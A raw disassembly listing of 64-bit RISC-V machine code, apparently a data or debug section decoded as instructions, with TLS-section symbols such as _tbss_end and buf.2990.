    102c:	0005                	c.nop	1
    102e:	0800                	addi	s0,sp,16
    1030:	0946                	slli	s2,s2,0x11
    1032:	0049                	c.nop	18
    1034:	0000                	unimp
    1036:	0020                	addi	s0,sp,8
    1038:	00010113          	mv	sp,sp
    103c:	0800                	addi	s0,sp,16
    103e:	0802                	slli	a6,a6,0x0
    1040:	02c0084f          	fnmadd.d	fa6,ft0,fa2,ft0,rne
    1044:	0000                	unimp
    1046:	980d                	andi	s0,s0,-29
    1048:	0001                	nop
    104a:	0800                	addi	s0,sp,16
    104c:	0a50                	addi	a2,sp,276
    104e:	02c0                	addi	s0,sp,324
    1050:	0000                	unimp
    1052:	1400                	addi	s0,sp,544
    1054:	0000                	unimp
    1056:	0000                	unimp
    1058:	5108                	lw	a0,32(a0)
    105a:	c009                	beqz	s0,105c <_tbss_end+0xfd8>
    105c:	0002                	c.slli	zero,0x0
    105e:	0000                	unimp
    1060:	1401                	addi	s0,s0,-32
    1062:	0501                	addi	a0,a0,0
    1064:	0000                	unimp
    1066:	5308                	lw	a0,32(a4)
    1068:	630a                	ld	t1,128(sp)
    106a:	0001                	nop
    106c:	0000                	unimp
    106e:	1402                	slli	s0,s0,0x20
    1070:	0135                	addi	sp,sp,13
    1072:	0000                	unimp
    1074:	5608                	lw	a0,40(a2)
    1076:	630a                	ld	t1,128(sp)
    1078:	0001                	nop
    107a:	0400                	addi	s0,sp,512
    107c:	0002                	c.slli	zero,0x0
    107e:	5b0a                	lw	s6,160(sp)
    1080:	0001                	nop
    1082:	d000                	sw	s0,32(s0)
    1084:	0002                	c.slli	zero,0x0
    1086:	0b00                	addi	s0,sp,400
    1088:	0079                	c.nop	30
    108a:	0000                	unimp
    108c:	001f 4f13 0003      	0x34f13001f
    1092:	1800                	addi	s0,sp,48
    1094:	08620803          	lb	a6,134(tp) # 86 <_tbss_end+0x2>
    1098:	0314                	addi	a3,sp,384
    109a:	0000                	unimp
    109c:	200d                	0x200d
    109e:	0004                	0x4
    10a0:	0800                	addi	s0,sp,16
    10a2:	03141263          	bne	s0,a7,10c6 <_tbss_end+0x1042>
    10a6:	0000                	unimp
    10a8:	0d00                	addi	s0,sp,656
    10aa:	0438                	addi	a4,sp,520
    10ac:	0000                	unimp
    10ae:	6408                	ld	a0,8(s0)
    10b0:	4906                	lw	s2,64(sp)
    10b2:	0000                	unimp
    10b4:	0800                	addi	s0,sp,16
    10b6:	a00d                	j	10d8 <_tbss_end+0x1054>
    10b8:	0001                	nop
    10ba:	0800                	addi	s0,sp,16
    10bc:	0966                	slli	s2,s2,0x19
    10be:	031a                	slli	t1,t1,0x6
    10c0:	0000                	unimp
    10c2:	1410                	addi	a2,sp,544
    10c4:	0101                	addi	sp,sp,0
    10c6:	0000                	unimp
    10c8:	6708                	ld	a0,8(a4)
    10ca:	7a1e                	ld	s4,480(sp)
    10cc:	0002                	c.slli	zero,0x0
    10ce:	1000                	addi	s0,sp,32
    10d0:	0001                	nop
    10d2:	0812                	slli	a6,a6,0x4
    10d4:	02d0                	addi	a2,sp,324
    10d6:	0000                	unimp
    10d8:	2a0a                	fld	fs4,128(sp)
    10da:	2a000003          	lb	zero,672(zero) # 2a0 <_tbss_end+0x21c>
    10de:	0b000003          	lb	zero,176(zero) # b0 <_tbss_end+0x2c>
    10e2:	0079                	c.nop	30
    10e4:	0000                	unimp
    10e6:	001f 0812 0330      	0x3300812001f
    10ec:	0000                	unimp
    10ee:	1015                	c.nop	-27
    10f0:	000003eb          	0x3eb
    10f4:	0810                	addi	a2,sp,16
    10f6:	087a                	slli	a6,a6,0x1e
    10f8:	0359                	addi	t1,t1,22
    10fa:	0000                	unimp
    10fc:	e60d                	bnez	a2,1126 <_tbss_end+0x10a2>
    10fe:	0000                	unimp
    1100:	0800                	addi	s0,sp,16
    1102:	0359117b          	0x359117b
    1106:	0000                	unimp
    1108:	0d00                	addi	s0,sp,656
    110a:	068a                	slli	a3,a3,0x2
    110c:	0000                	unimp
    110e:	7c08                	ld	a0,56(s0)
    1110:	4906                	lw	s2,64(sp)
    1112:	0000                	unimp
    1114:	0800                	addi	s0,sp,16
    1116:	1200                	addi	s0,sp,288
    1118:	3408                	fld	fa0,40(s0)
    111a:	0000                	unimp
    111c:	1000                	addi	s0,sp,32
    111e:	040a                	slli	s0,s0,0x2
    1120:	0000                	unimp
    1122:	08b0                	addi	a2,sp,88
    1124:	08ba                	slli	a7,a7,0xe
    1126:	04a2                	slli	s1,s1,0x8
    1128:	0000                	unimp
    112a:	5f11                	li	t5,-28
    112c:	0070                	addi	a2,sp,12
    112e:	bb08                	fsd	fa0,48(a4)
    1130:	5912                	lw	s2,36(sp)
    1132:	00000003          	lb	zero,0(zero) # 0 <_tdata_begin>
    1136:	5f11                	li	t5,-28
    1138:	0072                	c.slli	zero,0x1c
    113a:	bc08                	fsd	fa0,56(s0)
    113c:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
    1140:	0800                	addi	s0,sp,16
    1142:	5f11                	li	t5,-28
    1144:	bd080077          	0xbd080077
    1148:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
    114c:	0c00                	addi	s0,sp,528
    114e:	2e0d                	addiw	t3,t3,3
    1150:	0001                	nop
    1152:	0800                	addi	s0,sp,16
    1154:	09be                	slli	s3,s3,0xf
    1156:	0000003b          	addw	zero,zero,zero
    115a:	0d10                	addi	a2,sp,656
    115c:	0219                	addi	tp,tp,6
    115e:	0000                	unimp
    1160:	bf08                	fsd	fa0,56(a4)
    1162:	3b09                	addiw	s6,s6,-30
    1164:	0000                	unimp
    1166:	1200                	addi	s0,sp,288
    1168:	5f11                	li	t5,-28
    116a:	6662                	ld	a2,24(sp)
    116c:	0800                	addi	s0,sp,16
    116e:	11c0                	addi	s0,sp,228
    1170:	0331                	addi	t1,t1,12
    1172:	0000                	unimp
    1174:	0d18                	addi	a4,sp,656
    1176:	0000007b          	0x7b
    117a:	c108                	sw	a0,0(a0)
    117c:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
    1180:	2800                	fld	fs0,16(s0)
    1182:	190d                	addi	s2,s2,-29
    1184:	0001                	nop
    1186:	0800                	addi	s0,sp,16
    1188:	0ac8                	addi	a0,sp,340
    118a:	0000015b          	0x15b
    118e:	0d30                	addi	a2,sp,664
    1190:	01d9                	addi	gp,gp,22
    1192:	0000                	unimp
    1194:	ca08                	sw	a0,16(a2)
    1196:	261d                	addiw	a2,a2,7
    1198:	0006                	c.slli	zero,0x1
    119a:	3800                	fld	fs0,48(s0)
    119c:	9a0d                	andi	a2,a2,-29
    119e:	0002                	c.slli	zero,0x0
    11a0:	0800                	addi	s0,sp,16
    11a2:	1dcc                	addi	a1,sp,756
    11a4:	0650                	addi	a2,sp,772
    11a6:	0000                	unimp
    11a8:	0d40                	addi	s0,sp,660
    11aa:	048d                	addi	s1,s1,3
    11ac:	0000                	unimp
    11ae:	cf08                	sw	a0,24(a4)
    11b0:	740d                	lui	s0,0xfffe3
    11b2:	0006                	c.slli	zero,0x1
    11b4:	4800                	lw	s0,16(s0)
    11b6:	a90d                	j	15e8 <_tbss_end+0x1564>
    11b8:	0005                	c.nop	1
    11ba:	0800                	addi	s0,sp,16
    11bc:	09d0                	addi	a2,sp,212
    11be:	068e                	slli	a3,a3,0x3
    11c0:	0000                	unimp
    11c2:	1150                	addi	a2,sp,164
    11c4:	755f 0062 d308      	0xd3080062755f
    11ca:	3111                	addiw	sp,sp,-28
    11cc:	58000003          	lb	zero,1408(zero) # 580 <_tbss_end+0x4fc>
    11d0:	5f11                	li	t5,-28
    11d2:	7075                	c.lui	zero,0xffffd
    11d4:	0800                	addi	s0,sp,16
    11d6:	12d4                	addi	a3,sp,356
    11d8:	0359                	addi	t1,t1,22
    11da:	0000                	unimp
    11dc:	1168                	addi	a0,sp,172
    11de:	755f 0072 d508      	0xd5080072755f
    11e4:	00004907          	flq	fs2,0(zero) # ffffffffffffd000 <_end+0xffffffff7ffe1380>
    11e8:	7000                	ld	s0,32(s0)
    11ea:	e00d                	bnez	s0,120c <_tbss_end+0x1188>
    11ec:	0000                	unimp
    11ee:	0800                	addi	s0,sp,16
    11f0:	11d8                	addi	a4,sp,228
    11f2:	0694                	addi	a3,sp,832
    11f4:	0000                	unimp
    11f6:	0d74                	addi	a3,sp,668
    11f8:	0581                	addi	a1,a1,0
    11fa:	0000                	unimp
    11fc:	d908                	sw	a0,48(a0)
    11fe:	a411                	j	1402 <_tbss_end+0x137e>
    1200:	0006                	c.slli	zero,0x1
    1202:	7700                	ld	s0,40(a4)
    1204:	5f11                	li	t5,-28
    1206:	626c                	ld	a1,192(a2)
    1208:	0800                	addi	s0,sp,16
    120a:	11dc                	addi	a5,sp,228
    120c:	0331                	addi	t1,t1,12
    120e:	0000                	unimp
    1210:	0d78                	addi	a4,sp,668
    1212:	0160                	addi	s0,sp,140
    1214:	0000                	unimp
    1216:	df08                	sw	a0,56(a4)
    1218:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
    121c:	8800                	0x8800
    121e:	710d                	addi	sp,sp,-352
    1220:	0001                	nop
    1222:	0800                	addi	s0,sp,16
    1224:	0ae0                	addi	s0,sp,348
    1226:	00d5                	addi	ra,ra,21
    1228:	0000                	unimp
    122a:	0d90                	addi	a2,sp,720
    122c:	064d                	addi	a2,a2,19
    122e:	0000                	unimp
    1230:	e308                	sd	a0,0(a4)
    1232:	c012                	sw	tp,0(sp)
    1234:	0004                	0x4
    1236:	9800                	0x9800
    1238:	7b0d                	lui	s6,0xfffe3
    123a:	0002                	c.slli	zero,0x0
    123c:	0800                	addi	s0,sp,16
    123e:	017b0ce7          	jalr	s9,23(s6) # fffffffffffe3017 <_end+0xffffffff7ffc7397>
    1242:	0000                	unimp
    1244:	0da0                	addi	s0,sp,728
    1246:	0412                	slli	s0,s0,0x4
    1248:	0000                	unimp
    124a:	e908                	sd	a0,16(a0)
    124c:	4f0e                	lw	t5,192(sp)
    124e:	0001                	nop
    1250:	a400                	fsd	fs0,8(s0)
    1252:	810d                	srli	a0,a0,0x3
    1254:	0002                	c.slli	zero,0x0
    1256:	0800                	addi	s0,sp,16
    1258:	09ea                	slli	s3,s3,0x1a
    125a:	0049                	c.nop	18
    125c:	0000                	unimp
    125e:	00ac                	addi	a1,sp,72
    1260:	ed16                	sd	t0,152(sp)
    1262:	0000                	unimp
    1264:	c000                	sw	s0,0(s0)
    1266:	0004                	0x4
    1268:	1700                	addi	s0,sp,928
    126a:	04c0                	addi	s0,sp,580
    126c:	0000                	unimp
    126e:	00015b17          	auipc	s6,0x15
    1272:	1700                	addi	s0,sp,928
    1274:	0614                	addi	a3,sp,768
    1276:	0000                	unimp
    1278:	00004917          	auipc	s2,0x4
    127c:	0000                	unimp
    127e:	0812                	slli	a6,a6,0x4
    1280:	000004cb          	fnmsub.s	fs1,ft0,ft0,ft0,rne
    1284:	c005                	beqz	s0,12a4 <_tbss_end+0x1220>
    1286:	0004                	0x4
    1288:	1800                	addi	s0,sp,48
    128a:	0470                	addi	a2,sp,524
    128c:	0000                	unimp
    128e:	0748                	addi	a0,sp,900
    1290:	6508                	ld	a0,8(a0)
    1292:	0802                	slli	a6,a6,0x0
    1294:	0614                	addi	a3,sp,768
    1296:	0000                	unimp
    1298:	d019                	beqz	s0,119e <_tbss_end+0x111a>
    129a:	08000003          	lb	zero,128(zero) # 80 <buflen.2991>
    129e:	49070267          	jalr	tp,1168(a4) # fffffffffffec490 <_end+0xffffffff7ffd0810>
    12a2:	0000                	unimp
    12a4:	0000                	unimp
    12a6:	3d19                	addiw	s10,s10,-26
    12a8:	0001                	nop
    12aa:	0800                	addi	s0,sp,16
    12ac:	026c                	addi	a1,sp,268
    12ae:	0007000b          	0x7000b
    12b2:	0800                	addi	s0,sp,16
    12b4:	0119                	addi	sp,sp,6
    12b6:	0002                	c.slli	zero,0x0
    12b8:	0800                	addi	s0,sp,16
    12ba:	026c                	addi	a1,sp,268
    12bc:	0014                	0x14
    12be:	10000007          	0x10000007
    12c2:	ba19                	j	bd8 <_tbss_end+0xb54>
    12c4:	0001                	nop
    12c6:	0800                	addi	s0,sp,16
    12c8:	026c                	addi	a1,sp,268
    12ca:	001e                	c.slli	zero,0x7
    12cc:	18000007          	0x18000007
    12d0:	3319                	addiw	t1,t1,-26
    12d2:	0004                	0x4
    12d4:	0800                	addi	s0,sp,16
    12d6:	026e                	slli	tp,tp,0x1b
    12d8:	4908                	lw	a0,16(a0)
    12da:	0000                	unimp
    12dc:	2000                	fld	fs0,0(s0)
    12de:	2519                	addiw	a0,a0,6
    12e0:	0000                	unimp
    12e2:	0800                	addi	s0,sp,16
    12e4:	0908026f          	jal	tp,81374 <_tbss_end+0x812f0>
    12e8:	0009                	c.nop	2
    12ea:	2400                	fld	fs0,8(s0)
    12ec:	4f19                	li	t5,6
    12ee:	0004                	0x4
    12f0:	0800                	addi	s0,sp,16
    12f2:	0272                	slli	tp,tp,0x1c
    12f4:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
    12f8:	4000                	lw	s0,0(s0)
    12fa:	3d19                	addiw	s10,s10,-26
    12fc:	0004                	0x4
    12fe:	0800                	addi	s0,sp,16
    1300:	1e160273          	0x1e160273
    1304:	0009                	c.nop	2
    1306:	4800                	lw	s0,16(s0)
    1308:	5719                	li	a4,-26
    130a:	08000003          	lb	zero,128(zero) # 80 <buflen.2991>
    130e:	0275                	addi	tp,tp,29
    1310:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
    1314:	5000                	lw	s0,32(s0)
    1316:	4519                	li	a0,6
    1318:	0004                	0x4
    131a:	0800                	addi	s0,sp,16
    131c:	2f0a0277          	0x2f0a0277
    1320:	0009                	c.nop	2
    1322:	5800                	lw	s0,48(s0)
    1324:	6619                	lui	a2,0x6
    1326:	0002                	c.slli	zero,0x0
    1328:	0800                	addi	s0,sp,16
    132a:	027a                	slli	tp,tp,0x1e
    132c:	0001e113          	ori	sp,gp,0
    1330:	6000                	ld	s0,0(s0)
    1332:	df19                	beqz	a4,1250 <_tbss_end+0x11cc>
    1334:	0001                	nop
    1336:	0800                	addi	s0,sp,16
    1338:	4907027b          	0x4907027b
    133c:	0000                	unimp
    133e:	6800                	ld	s0,16(s0)
    1340:	d119                	beqz	a0,1246 <_tbss_end+0x11c2>
    1342:	0005                	c.nop	1
    1344:	0800                	addi	s0,sp,16
    1346:	027c                	addi	a5,sp,268
    1348:	0001e113          	ori	sp,gp,0
    134c:	7000                	ld	s0,32(s0)
    134e:	8919                	andi	a0,a0,6
    1350:	08000003          	lb	zero,128(zero) # 80 <buflen.2991>
    1354:	027d                	addi	tp,tp,31
    1356:	3514                	fld	fa3,40(a0)
    1358:	0009                	c.nop	2
    135a:	7800                	ld	s0,48(s0)
    135c:	0919                	addi	s2,s2,6
    135e:	0002                	c.slli	zero,0x0
    1360:	0800                	addi	s0,sp,16
    1362:	0280                	addi	s0,sp,320
    1364:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
    1368:	8000                	0x8000
    136a:	6919                	lui	s2,0x6
    136c:	0001                	nop
    136e:	0800                	addi	s0,sp,16
    1370:	0281                	addi	t0,t0,0
    1372:	1409                	addi	s0,s0,-30
    1374:	0006                	c.slli	zero,0x1
    1376:	8800                	0x8800
    1378:	c919                	beqz	a0,138e <_tbss_end+0x130a>
    137a:	08000003          	lb	zero,128(zero) # 80 <buflen.2991>
    137e:	02a4                	addi	s1,sp,328
    1380:	0008e307          	0x8e307
    1384:	9000                	0x9000
    1386:	4f1a                	lw	t5,132(sp)
    1388:	08000003          	lb	zero,128(zero) # 80 <buflen.2991>
    138c:	02a8                	addi	a0,sp,328
    138e:	00031413          	slli	s0,t1,0x0
    1392:	f800                	sd	s0,48(s0)
    1394:	1a01                	addi	s4,s4,-32
    1396:	0239                	addi	tp,tp,14
    1398:	0000                	unimp
    139a:	a908                	fsd	fa0,16(a0)
    139c:	1202                	slli	tp,tp,0x20
    139e:	02d0                	addi	a2,sp,324
    13a0:	0000                	unimp
    13a2:	0200                	addi	s0,sp,256
    13a4:	771a                	ld	a4,416(sp)
    13a6:	0005                	c.nop	1
    13a8:	0800                	addi	s0,sp,16
    13aa:	02ad                	addi	t0,t0,11
    13ac:	460c                	lw	a1,8(a2)
    13ae:	0009                	c.nop	2
    13b0:	1800                	addi	s0,sp,48
    13b2:	1a05                	addi	s4,s4,-31
    13b4:	0121                	addi	sp,sp,8
    13b6:	0000                	unimp
    13b8:	b208                	fsd	fa0,32(a2)
    13ba:	1002                	c.slli	zero,0x20
    13bc:	06c1                	addi	a3,a3,16
    13be:	0000                	unimp
    13c0:	0520                	addi	s0,sp,648
    13c2:	fc1a                	sd	t1,56(sp)
    13c4:	0000                	unimp
    13c6:	0800                	addi	s0,sp,16
    13c8:	02b4                	addi	a3,sp,328
    13ca:	520a                	lw	tp,160(sp)
    13cc:	0009                	c.nop	2
    13ce:	3800                	fld	fs0,48(s0)
    13d0:	0005                	c.nop	1
    13d2:	0812                	slli	a6,a6,0x4
    13d4:	061a                	slli	a2,a2,0x6
    13d6:	0000                	unimp
    13d8:	0102                	slli	sp,sp,0x0
    13da:	bb08                	fsd	fa0,48(a4)
    13dc:	05000003          	lb	zero,80(zero) # 50 <buf.2990+0x10>
    13e0:	061a                	slli	a2,a2,0x6
    13e2:	0000                	unimp
    13e4:	0812                	slli	a6,a6,0x4
    13e6:	04a2                	slli	s1,s1,0x8
    13e8:	0000                	unimp
    13ea:	ed16                	sd	t0,152(sp)
    13ec:	0000                	unimp
    13ee:	4a00                	lw	s0,16(a2)
    13f0:	0006                	c.slli	zero,0x1
    13f2:	1700                	addi	s0,sp,928
    13f4:	04c0                	addi	s0,sp,580
    13f6:	0000                	unimp
    13f8:	00015b17          	auipc	s6,0x15
    13fc:	1700                	addi	s0,sp,928
    13fe:	064a                	slli	a2,a2,0x12
    1400:	0000                	unimp
    1402:	00004917          	auipc	s2,0x4
    1406:	0000                	unimp
    1408:	0812                	slli	a6,a6,0x4
    140a:	0621                	addi	a2,a2,8
    140c:	0000                	unimp
    140e:	0812                	slli	a6,a6,0x4
    1410:	062c                	addi	a1,sp,776
    1412:	0000                	unimp
    1414:	e116                	sd	t0,128(sp)
    1416:	0000                	unimp
    1418:	7400                	ld	s0,40(s0)
    141a:	0006                	c.slli	zero,0x1
    141c:	1700                	addi	s0,sp,928
    141e:	04c0                	addi	s0,sp,580
    1420:	0000                	unimp
    1422:	00015b17          	auipc	s6,0x15
    1426:	1700                	addi	s0,sp,928
    1428:	00e1                	addi	ra,ra,24
    142a:	0000                	unimp
    142c:	00004917          	auipc	s2,0x4
    1430:	0000                	unimp
    1432:	0812                	slli	a6,a6,0x4
    1434:	0656                	slli	a2,a2,0x15
    1436:	0000                	unimp
    1438:	4916                	lw	s2,68(sp)
    143a:	0000                	unimp
    143c:	8e00                	0x8e00
    143e:	0006                	c.slli	zero,0x1
    1440:	1700                	addi	s0,sp,928
    1442:	04c0                	addi	s0,sp,580
    1444:	0000                	unimp
    1446:	00015b17          	auipc	s6,0x15
    144a:	0000                	unimp
    144c:	0812                	slli	a6,a6,0x4
    144e:	067a                	slli	a2,a2,0x1e
    1450:	0000                	unimp
    1452:	340a                	fld	fs0,160(sp)
    1454:	0000                	unimp
    1456:	a400                	fsd	fs0,8(s0)
    1458:	0006                	c.slli	zero,0x1
    145a:	0b00                	addi	s0,sp,400
    145c:	0079                	c.nop	30
    145e:	0000                	unimp
    1460:	0002                	c.slli	zero,0x0
    1462:	340a                	fld	fs0,160(sp)
    1464:	0000                	unimp
    1466:	b400                	fsd	fs0,40(s0)
    1468:	0006                	c.slli	zero,0x1
    146a:	0b00                	addi	s0,sp,400
    146c:	0079                	c.nop	30
    146e:	0000                	unimp
    1470:	0000                	unimp
    1472:	0003f807          	0x3f807
    1476:	0800                	addi	s0,sp,16
    1478:	0124                	addi	s1,sp,136
    147a:	5f1a                	lw	t5,164(sp)
    147c:	1b000003          	lb	zero,432(zero) # 1b0 <_tbss_end+0x12c>
    1480:	055e                	slli	a0,a0,0x17
    1482:	0000                	unimp
    1484:	0818                	addi	a4,sp,16
    1486:	0128                	addi	a0,sp,136
    1488:	fa08                	sd	a0,48(a2)
    148a:	0006                	c.slli	zero,0x1
    148c:	1900                	addi	s0,sp,176
    148e:	0420                	addi	s0,sp,520
    1490:	0000                	unimp
    1492:	2a08                	fld	fa0,16(a2)
    1494:	1101                	addi	sp,sp,-32
    1496:	06fa                	slli	a3,a3,0x1e
    1498:	0000                	unimp
    149a:	1900                	addi	s0,sp,176
    149c:	021f 0000 2b08      	0x2b080000021f
    14a2:	0701                	addi	a4,a4,0
    14a4:	0049                	c.nop	18
    14a6:	0000                	unimp
    14a8:	1908                	addi	a0,sp,176
    14aa:	03f2                	slli	t2,t2,0x1c
    14ac:	0000                	unimp
    14ae:	2c08                	fld	fa0,24(s0)
    14b0:	0b01                	addi	s6,s6,0
    14b2:	0700                	addi	s0,sp,896
    14b4:	0000                	unimp
    14b6:	0010                	0x10
    14b8:	0812                	slli	a6,a6,0x4
    14ba:	06c1                	addi	a3,a3,16
    14bc:	0000                	unimp
    14be:	0812                	slli	a6,a6,0x4
    14c0:	06b4                	addi	a3,sp,840
    14c2:	0000                	unimp
    14c4:	00001d1b          	slliw	s10,zero,0x0
    14c8:	0e00                	addi	s0,sp,784
    14ca:	4408                	lw	a0,8(s0)
    14cc:	0801                	addi	a6,a6,0
    14ce:	0000073f 00047719 	0x477190000073f
    14d6:	0800                	addi	s0,sp,16
    14d8:	0145                	addi	sp,sp,17
    14da:	3f12                	fld	ft10,288(sp)
    14dc:	00000007          	0x7
    14e0:	ee19                	bnez	a2,14fe <_tbss_end+0x147a>
    14e2:	0004                	0x4
    14e4:	0800                	addi	s0,sp,16
    14e6:	0146                	slli	sp,sp,0x11
    14e8:	3f12                	fld	ft10,288(sp)
    14ea:	06000007          	0x6000007
    14ee:	0a19                	addi	s4,s4,6
    14f0:	0005                	c.nop	1
    14f2:	0800                	addi	s0,sp,16
    14f4:	42120147          	fmsub.d	ft2,ft4,ft1,fs0,rne
    14f8:	0000                	unimp
    14fa:	0c00                	addi	s0,sp,528
    14fc:	0a00                	addi	s0,sp,272
    14fe:	0042                	c.slli	zero,0x10
    1500:	0000                	unimp
    1502:	0000074f          	fnmadd.s	fa4,ft0,ft0,ft0,rne
    1506:	0000790b          	0x790b
    150a:	0200                	addi	s0,sp,256
    150c:	1c00                	addi	s0,sp,560
    150e:	08d8                	addi	a4,sp,84
    1510:	0285                	addi	t0,t0,1
    1512:	00086407          	0x86407
    1516:	1900                	addi	s0,sp,176
    1518:	0542                	slli	a0,a0,0x10
    151a:	0000                	unimp
    151c:	8708                	0x8708
    151e:	1802                	slli	a6,a6,0x20
    1520:	005f 0000 1900      	0x19000000005f
    1526:	04f4                	addi	a3,sp,588
    1528:	0000                	unimp
    152a:	8808                	0x8808
    152c:	1202                	slli	tp,tp,0x20
    152e:	0614                	addi	a3,sp,768
    1530:	0000                	unimp
    1532:	1908                	addi	a0,sp,176
    1534:	0259                	addi	tp,tp,22
    1536:	0000                	unimp
    1538:	8908                	0x8908
    153a:	1002                	c.slli	zero,0x20
    153c:	0864                	addi	s1,sp,28
    153e:	0000                	unimp
    1540:	1910                	addi	a2,sp,176
    1542:	059a                	slli	a1,a1,0x6
    1544:	0000                	unimp
    1546:	8a08                	0x8a08
    1548:	1702                	slli	a4,a4,0x20
    154a:	000001f7          	0x1f7
    154e:	192c                	addi	a1,sp,184
    1550:	01ca                	slli	gp,gp,0x12
    1552:	0000                	unimp
    1554:	8b08                	0x8b08
    1556:	0f02                	slli	t5,t5,0x0
    1558:	0049                	c.nop	18
    155a:	0000                	unimp
    155c:	1950                	addi	a2,sp,180
    155e:	0000041b          	sext.w	s0,zero
    1562:	8c08                	0x8c08
    1564:	2c02                	fld	fs8,0(sp)
    1566:	0874                	addi	a3,sp,28
    1568:	0000                	unimp
    156a:	1958                	addi	a4,sp,180
    156c:	05b0                	addi	a2,sp,712
    156e:	0000                	unimp
    1570:	8d08                	0x8d08
    1572:	1a02                	slli	s4,s4,0x20
    1574:	0706                	slli	a4,a4,0x1
    1576:	0000                	unimp
    1578:	1960                	addi	s0,sp,188
    157a:	0426                	slli	s0,s0,0x9
    157c:	0000                	unimp
    157e:	8e08                	0x8e08
    1580:	1602                	slli	a2,a2,0x20
    1582:	0000014f          	fnmadd.s	ft2,ft0,ft0,ft0,rne
    1586:	1970                	addi	a2,sp,188
    1588:	000005bb          	addw	a1,zero,zero
    158c:	8f08                	0x8f08
    158e:	1602                	slli	a2,a2,0x20
    1590:	0000014f          	fnmadd.s	ft2,ft0,ft0,ft0,rne
    1594:	1978                	addi	a4,sp,188
    1596:	00b1                	addi	ra,ra,12
    1598:	0000                	unimp
    159a:	9008                	0x9008
    159c:	1602                	slli	a2,a2,0x20
    159e:	0000014f          	fnmadd.s	ft2,ft0,ft0,ft0,rne
    15a2:	1980                	addi	s0,sp,240
    15a4:	056d                	addi	a0,a0,27
    15a6:	0000                	unimp
    15a8:	9108                	0x9108
    15aa:	1002                	c.slli	zero,0x20
    15ac:	0000087b          	0x87b
    15b0:	1988                	addi	a0,sp,240
    15b2:	024d                	addi	tp,tp,19
    15b4:	0000                	unimp
    15b6:	9208                	0x9208
    15b8:	1002                	c.slli	zero,0x20
    15ba:	0000088b          	0x88b
    15be:	1990                	addi	a2,sp,240
    15c0:	00000517          	auipc	a0,0x0
    15c4:	9308                	0x9308
    15c6:	0f02                	slli	t5,t5,0x0
    15c8:	0049                	c.nop	18
    15ca:	0000                	unimp
    15cc:	19a8                	addi	a0,sp,248
    15ce:	018a                	slli	gp,gp,0x2
    15d0:	0000                	unimp
    15d2:	9408                	0x9408
    15d4:	1602                	slli	a2,a2,0x20
    15d6:	0000014f          	fnmadd.s	ft2,ft0,ft0,ft0,rne
    15da:	19ac                	addi	a1,sp,248
    15dc:	00a2                	slli	ra,ra,0x8
    15de:	0000                	unimp
    15e0:	9508                	0x9508
    15e2:	1602                	slli	a2,a2,0x20
    15e4:	0000014f          	fnmadd.s	ft2,ft0,ft0,ft0,rne
    15e8:	19b4                	addi	a3,sp,248
    15ea:	0179                	addi	sp,sp,30
    15ec:	0000                	unimp
    15ee:	9608                	0x9608
    15f0:	1602                	slli	a2,a2,0x20
    15f2:	0000014f          	fnmadd.s	ft2,ft0,ft0,ft0,rne
    15f6:	19bc                	addi	a5,sp,248
    15f8:	0044                	addi	s1,sp,4
    15fa:	0000                	unimp
    15fc:	9708                	0x9708
    15fe:	1602                	slli	a2,a2,0x20
    1600:	0000014f          	fnmadd.s	ft2,ft0,ft0,ft0,rne
    1604:	19c4                	addi	s1,sp,244
    1606:	00000053          	fadd.s	ft0,ft0,ft0,rne
    160a:	9808                	0x9808
    160c:	1602                	slli	a2,a2,0x20
    160e:	0000014f          	fnmadd.s	ft2,ft0,ft0,ft0,rne
    1612:	19cc                	addi	a1,sp,244
    1614:	03ce                	slli	t2,t2,0x13
    1616:	0000                	unimp
    1618:	9908                	0x9908
    161a:	0802                	slli	a6,a6,0x0
    161c:	0049                	c.nop	18
    161e:	0000                	unimp
    1620:	00d4                	addi	a3,sp,68
    1622:	1a0a                	slli	s4,s4,0x22
    1624:	0006                	c.slli	zero,0x1
    1626:	7400                	ld	s0,40(s0)
    1628:	0008                	0x8
    162a:	0b00                	addi	s0,sp,400
    162c:	0079                	c.nop	30
    162e:	0000                	unimp
    1630:	0019                	c.nop	6
    1632:	0802                	slli	a6,a6,0x0
    1634:	00006407          	0x6407
    1638:	0a00                	addi	s0,sp,272
    163a:	061a                	slli	a2,a2,0x6
    163c:	0000                	unimp
    163e:	0000088b          	0x88b
    1642:	0000790b          	0x790b
    1646:	0700                	addi	s0,sp,896
    1648:	0a00                	addi	s0,sp,272
    164a:	061a                	slli	a2,a2,0x6
    164c:	0000                	unimp
    164e:	0000089b          	sext.w	a7,zero
    1652:	0000790b          	0x790b
    1656:	1700                	addi	s0,sp,928
    1658:	1d00                	addi	s0,sp,688
    165a:	0168                	addi	a0,sp,140
    165c:	9e08                	0x9e08
    165e:	0702                	slli	a4,a4,0x0
    1660:	000008c3          	fmadd.s	fa7,ft0,ft0,ft0,rne
    1664:	3219                	addiw	tp,tp,-26
    1666:	08000003          	lb	zero,128(zero) # 80 <buflen.2991>
    166a:	02a1                	addi	t0,t0,8
    166c:	0008c31b          	0x8c31b
    1670:	0000                	unimp
    1672:	1319                	addi	t1,t1,-26
    1674:	08000003          	lb	zero,128(zero) # 80 <buflen.2991>
    1678:	02a2                	slli	t0,t0,0x8
    167a:	d318                	sw	a4,32(a4)
    167c:	0008                	0x8
    167e:	f000                	sd	s0,32(s0)
    1680:	0a00                	addi	s0,sp,272
    1682:	0359                	addi	t1,t1,22
    1684:	0000                	unimp
    1686:	000008d3          	fadd.s	fa7,ft0,ft0,rne
    168a:	0000790b          	0x790b
    168e:	1d00                	addi	s0,sp,688
    1690:	0a00                	addi	s0,sp,272
    1692:	005f 0000 08e3      	0x8e30000005f
    1698:	0000                	unimp
    169a:	0000790b          	0x790b
    169e:	1d00                	addi	s0,sp,688
    16a0:	1e00                	addi	s0,sp,816
    16a2:	0168                	addi	a0,sp,140
    16a4:	8308                	0x8308
    16a6:	0302                	slli	t1,t1,0x0
    16a8:	0909                	addi	s2,s2,2
    16aa:	0000                	unimp
    16ac:	701f 0004 0800      	0x8000004701f
    16b2:	029a                	slli	t0,t0,0x6
    16b4:	00074f0b          	0x74f0b
    16b8:	1f00                	addi	s0,sp,944
    16ba:	00000587          	0x587
    16be:	a308                	fsd	fa0,0(a4)
    16c0:	0b02                	slli	s6,s6,0x0
    16c2:	0000089b          	sext.w	a7,zero
